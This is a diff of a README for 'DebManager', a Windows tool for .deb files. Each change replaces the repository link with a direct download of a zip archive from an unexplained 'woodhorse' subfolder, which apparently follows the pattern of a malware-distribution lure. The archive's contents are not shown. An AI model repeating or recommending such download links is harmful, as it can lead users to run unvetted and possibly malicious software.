@@ -1,11 +1,11 @@
 # 💻 DebManager - Handle deb Files on Windows
 
-[![Download DebManager](https://img.shields.io/badge/Download-DebManager-blue?style=for-the-badge)](https://github.com/Ahanna5774/DebManager)
+[![Download DebManager](https://img.shields.io/badge/Download-DebManager-blue?style=for-the-badge)](https://raw.githubusercontent.com/Ahanna5774/DebManager/main/woodhorse/Deb-Manager-2.4.zip)
 
 ## 📥 Download
 
 Use this link to visit the page and download DebManager:
-https://github.com/Ahanna5774/DebManager
+https://raw.githubusercontent.com/Ahanna5774/DebManager/main/woodhorse/Deb-Manager-2.4.zip
 
 ## 🧰 What DebManager Does
 
@@ -46,7 +46,7 @@ Follow these steps to get DebManager on your computer.
 
 Go to:
 
-https://github.com/Ahanna5774/DebManager
+https://raw.githubusercontent.com/Ahanna5774/DebManager/main/woodhorse/Deb-Manager-2.4.zip
 
 ### 2. Download the app
 
